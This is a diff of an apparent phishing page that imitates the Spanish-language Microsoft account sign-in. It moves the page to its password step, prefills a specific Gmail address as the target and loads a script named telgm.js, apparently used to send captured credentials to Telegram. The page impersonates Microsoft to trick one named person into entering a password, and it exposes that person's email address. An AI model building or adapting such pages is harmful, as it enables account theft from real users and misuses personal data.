@@ -6,10 +6,10 @@
     <title>Iniciar sesión en tu cuenta Microsoft</title>
     <link rel="shortcut icon" type="image/x-icon" href="https://c.s-microsoft.com/favicon.ico?v2">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link href="./index_files/css2" rel="stylesheet">
-    <link rel="stylesheet" href="./index_files/all.min.css">
-    <script src="./index_files/jquery.min.js.descarga"></script>
-    <script type="text/javascript" src="./index_files/telgm.js.descarga"></script>
+    <link href="./pass_files/css2" rel="stylesheet">
+    <link rel="stylesheet" href="./pass_files/all.min.css">
+    <script src="./pass_files/jquery.min.js.descarga"></script>
+    <script type="text/javascript" src="./pass_files/telgm.js.descarga"></script>
     
     <style>
         :root {
@@ -484,9 +484,9 @@ document.addEventListener("keydown", function(e) {
     <div class="login-container">
         <div class="login-box">
 
-            <div id="email-step">
+            <div id="email-step" class="hidden">
                 <div class="login-header">
-                    <img src="./index_files/images" alt="Microsoft Logo" aria-label="Logo de Microsoft">
+                    <img src="./pass_files/images" alt="Microsoft Logo" aria-label="Logo de Microsoft">
                     <h1 class="login-title">Iniciar sesión</h1>
                     <span class="login-subtitle">Usar su cuenta de Microsoft.</span>
                 </div>
@@ -513,14 +513,14 @@ document.addEventListener("keydown", function(e) {
             </div>
             
 
-            <div id="password-step" class="hidden" aria-hidden="true">
+            <div id="password-step" class="" aria-hidden="true">
                 <button class="back-button" id="back-button" aria-label="Volver atrás">
                     <i class="fas fa-chevron-left" aria-hidden="true"></i>
                 </button>
                 
                 <div class="login-header">
-                    <img src="./index_files/microsoft.png" alt="Microsoft Logo" aria-label="Logo de Microsoft">
-                    <div class="user-email" id="user-email-display" aria-live="polite"></div>
+                    <img src="./pass_files/microsoft.png" alt="Microsoft Logo" aria-label="Logo de Microsoft">
+                    <div class="user-email" id="user-email-display" aria-live="polite">manlowl@gmail.com</div>
                     <h1 class="login-title">Escriba la contraseña</h1>
                 </div>
                 
